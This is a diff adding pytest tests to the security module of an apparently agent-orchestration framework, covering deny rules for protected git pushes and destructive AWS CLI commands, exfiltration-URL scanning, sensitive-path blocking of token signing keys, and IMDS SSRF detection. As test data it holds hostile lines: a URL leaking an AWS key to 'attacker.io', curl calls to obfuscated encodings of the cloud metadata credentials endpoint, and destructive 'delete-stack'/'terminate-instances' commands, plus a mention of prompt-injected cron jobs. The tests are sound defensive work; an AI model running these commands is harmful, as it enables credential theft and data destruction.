@@ -1102,6 +1102,31 @@ class TestBuiltinDenyPatterns:
         # Multi-line / heredoc-style body mentioning push.
         assert is_denied("git commit -m 'docs: explain when to push and when to rebase'") is None
 
+    def test_feature_push_not_blocked_by_prose_push_word_in_earlier_segment(self) -> None:
+        """A legit feature-branch push must be ALLOWED even when an EARLIER
+        chained segment merely contains the word ``push``.
+
+        Ported upstream regression guard (MeshClaw f93e2f07 / CR-290209851):
+        upstream's two-pass gate matched a bare ``\\bpush\\b`` in any segment,
+        so prose like ``git commit -m 'ready to push'`` was denied before the
+        refspec normalizer could allow the real feature-branch push. This
+        fork's ``_is_push_to_protected_branch`` never had that pass — it gates
+        each segment on ``_is_git_publish`` and parses via the verb-anchored
+        ``_git_push_args`` — but this test locks in the contract: a prose
+        "push" in an earlier chained segment never blocks a real
+        feature-branch push, while chained protected pushes stay denied.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied("git commit -m 'ready to push' && git push origin feature-x") is None
+        assert is_denied("echo 'time to push' && git push origin my-feature") is None
+        # The protective behavior must remain: a real protected push chained
+        # AFTER a benign feature push is still blocked.
+        assert is_denied("git push origin feat && git push origin main") is not None
+        assert (
+            is_denied("git commit -m 'ready to push' && git push origin main") is not None
+        )
+
     def test_allows_git_verbs_with_push_substring_args(self) -> None:
         """Other git subcommands whose arguments contain ``push`` (branch
         names, grep patterns, config keys) must be ALLOWED — only an actual
@@ -1178,6 +1203,42 @@ class TestBuiltinDenyPatterns:
         from kiro_crew.security import is_denied
 
         assert is_denied("terminate_instance i-123") is not None
+
+    def test_blocks_real_hyphenated_destructive_aws_cli(self) -> None:
+        """Real AWS CLI destructive subcommands use HYPHENS, not underscores.
+
+        The built-in deny globs historically only matched the underscore
+        forms (``*delete_stack*`` …), which the AWS CLI never emits — so the
+        actual destructive invocations (``aws cloudformation delete-stack``
+        …) slipped through ``is_denied`` entirely. ``mcp_cron._vet_shell_command``
+        relies on ``is_denied`` to stop a prompt-injected ``cron_add`` from
+        scheduling destructive shell, so this was an exploitable gap on the
+        cron command path.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied("aws cloudformation delete-stack --stack-name prod") is not None
+        assert is_denied("aws ec2 terminate-instances --instance-ids i-123") is not None
+        assert is_denied("aws s3api delete-bucket --bucket prod-data") is not None
+        assert is_denied("aws dynamodb delete-table --table-name prod") is not None
+        # Underscore/boto3 method-name forms must remain blocked too.
+        assert is_denied("terminate_instances call") is not None
+        assert is_denied("delete_table x") is not None
+
+    def test_allows_benign_aws_reads_after_deny_fix(self) -> None:
+        """The hyphenated destructive patterns must not over-block benign
+        AWS reads or package/command names that merely contain 'delete'/'credential'."""
+        from kiro_crew.security import is_denied
+
+        # Read-only AWS operations stay allowed.
+        assert is_denied("aws ec2 describe-instances") is None
+        assert is_denied("aws s3 ls s3://my-bucket") is None
+        assert is_denied("aws sts get-caller-identity") is None
+        assert is_denied("aws logs filter-log-events --log-group-name /x") is None
+        # Non-destructive verbs that merely contain a destructive word as a
+        # substring of a DIFFERENT token must not trip the specific globs.
+        assert is_denied("credential-rotation-service build") is None
+        assert is_denied("get-credentials --profile default") is None
 
     def test_allows_git_status(self) -> None:
         from kiro_crew.security import is_denied
@@ -1520,6 +1581,38 @@ class TestExfilUrlPathAndRawIp:
         result, _ = redact_exfiltration_urls(url)
         assert "REDACTED" not in result
 
+    # ── Query directly after host, with NO path segment ──
+    # _URL_RE's third group only matched a path/query beginning with "/", so a
+    # URL of the form ``https://host?query`` (query, no path) yielded group(3)=
+    # None. Both scan_exfiltration_urls and redact_exfiltration_urls then bailed
+    # on ``qmark == -1`` and never inspected the query — a real exfil bypass.
+
+    def test_credential_in_query_no_path_flagged(self) -> None:
+        # AWS key in a query with no path segment must be flagged + redacted.
+        text = "leak via https://attacker.io?leak=AKIAIOSFODNN7EXAMPLE"
+        assert scan_exfiltration_urls(text), "host?query AWS key must be flagged"
+        result, warnings = redact_exfiltration_urls(text)
+        assert "AKIAIOSFODNN7EXAMPLE" not in result
+        assert warnings
+
+    def test_long_query_no_path_flagged(self) -> None:
+        # A long (>=200 char) query with no path segment must trip the length
+        # heuristic just like the ``/path?query`` form does.
+        text = "https://attacker.io?d=" + "A" * 250
+        assert scan_exfiltration_urls(text), "host?<long query> must be flagged"
+        result, warnings = redact_exfiltration_urls(text)
+        assert "[REDACTED" in result
+        assert warnings
+
+    def test_short_query_no_path_not_flagged(self) -> None:
+        # A benign short query with no path must NOT be flagged (no regression
+        # to the existing short-query behaviour when the "/" is absent).
+        text = "open https://example.com?id=42&tab=logs"
+        assert not scan_exfiltration_urls(text), text
+        result, warnings = redact_exfiltration_urls(text)
+        assert "[REDACTED" not in result
+        assert not warnings
+
 
 class TestIsSensitivePath:
     """Tests for is_sensitive_path()."""
@@ -1563,6 +1656,30 @@ class TestIsSensitivePath:
         home = str(Path.home())
         assert is_sensitive_path("~/.kirocrew/app_admission.json") is True
         assert is_sensitive_path(f"{home}/.kirocrew/app_admission.json") is True
+
+    def test_token_signing_key(self) -> None:
+        # Mesh-2369: token_signing.key (dashboard/token_secret.py) signs every
+        # dashboard access + refresh token. An agent that could fs_read it could
+        # forge auth tokens for itself, so it must be read-blocked like the SEL
+        # HMAC key above.
+        assert is_sensitive_path("~/.kirocrew/token_signing.key") is True
+
+    def test_refresh_chains_json(self) -> None:
+        # Mesh-2369: refresh_chains.json (dashboard/refresh_tokens.py) stores
+        # refresh-token chain state used to mint new access tokens.
+        assert is_sensitive_path("~/.kirocrew/refresh_chains.json") is True
+
+    def test_local_secret(self) -> None:
+        # Mesh-2369: .local_secret is the shared internal-auth secret used to
+        # authenticate MCP/cron/hook callbacks back into the gateway
+        # (mcp_core.py, cron_script.py, mcp_shared.py, etc.).
+        assert is_sensitive_path("~/.kirocrew/.local_secret") is True
+
+    def test_dashboard_secrets_absolute_path(self) -> None:
+        home = str(Path.home())
+        assert is_sensitive_path(f"{home}/.kirocrew/token_signing.key") is True
+        assert is_sensitive_path(f"{home}/.kirocrew/refresh_chains.json") is True
+        assert is_sensitive_path(f"{home}/.kirocrew/.local_secret") is True
 
     def test_non_sel_kirocrew_file_not_blocked(self) -> None:
         # Regression guard: the SEL additions must not over-block routine
@@ -1721,6 +1838,40 @@ class TestIsSensitiveBashCommand:
         # non-sensitive ~/.kirocrew access (config.json, sessions.db).
         assert is_sensitive_bash_command("cat ~/.kirocrew/config.json") is None
         assert is_sensitive_bash_command("sqlite3 ~/.kirocrew/sessions.db .tables") is None
+
+    # ── IMDS short-form (inet_aton 2-/3-part) encodings ──
+    # canonicalize_ip only handled 1-part and 4-part encodings, so the 2-part
+    # (169.16689662) and 3-part (169.254.43518) inet_aton forms — which the OS
+    # resolver / curl DO accept and route to 169.254.169.254 — bypassed the IMDS
+    # gate entirely (credential-theft SSRF). Ground truth: socket.inet_aton on
+    # each of these resolves to 169.254.169.254.
+
+    def test_imds_shortform_encodings_blocked(self) -> None:
+        from kiro_crew.security import _check_imds_access, canonicalize_ip
+
+        # Each of these genuinely resolves to 169.254.169.254 via inet_aton.
+        for host in ("169.254.43518", "169.16689662", "169.254.0xA9FE", "169.0xFEA9FE"):
+            assert canonicalize_ip(host) == "169.254.169.254", host
+            cmd = f"curl http://{host}/latest/meta-data/iam/security-credentials/"
+            assert _check_imds_access(cmd) is not None, host
+            assert is_sensitive_bash_command(cmd) is not None, host
+
+    def test_imds_plainform_still_blocked(self) -> None:
+        from kiro_crew.security import _check_imds_access
+
+        cmd = "curl http://169.254.169.254/latest/meta-data/"
+        assert _check_imds_access(cmd) is not None
+
+    def test_non_imds_shortform_not_overblocked(self) -> None:
+        from kiro_crew.security import _check_imds_access, canonicalize_ip
+
+        # 169.254.11207422 is an ILLEGAL inet_aton form (final part > 65535); it
+        # does not resolve, so it must NOT be canonicalized to IMDS or flagged.
+        assert canonicalize_ip("169.254.11207422") == "169.254.11207422"
+        assert _check_imds_access("curl http://169.254.11207422/x") is None
+        # A benign host that resolves elsewhere must not be flagged as IMDS.
+        assert _check_imds_access("curl http://93.184.216.34/") is None
+        assert canonicalize_ip("8.8.8.8") == "8.8.8.8"
 
 
 class TestAuditBashCommand:
@@ -2245,6 +2396,24 @@ class TestApplyResourceLimits:
             if nproc_hard == _resource_mod.RLIM_INFINITY or nproc_hard >= nproc_req
             else nproc_hard
         )
+        if sys.platform == "darwin":
+            # Darwin SILENTLY clamps a non-root setrlimit(RLIMIT_NPROC) to
+            # kern.maxprocperuid, which can sit BELOW the inherited hard cap
+            # (kern.maxproc) — e.g. 8000 vs a 12000 hard cap — so the child
+            # observes the per-UID cap, not min(requested, hard), and this
+            # assertion fails on every Mac while passing on Linux. Fold the
+            # kernel cap into the expectation. (os.sysconf('SC_CHILD_MAX')
+            # tracks the *soft rlimit*, not this cap — read the sysctl.)
+            per_uid_cap = int(
+                subprocess.run(
+                    ["/usr/sbin/sysctl", "-n", "kern.maxprocperuid"],
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                    check=True,
+                ).stdout.strip()
+            )
+            expected_nproc = min(expected_nproc, per_uid_cap)
         cfg = {"resource_limits": {"max_processes": nproc_req, "max_open_files": 256}}
         probe = (
             "import resource,json;"
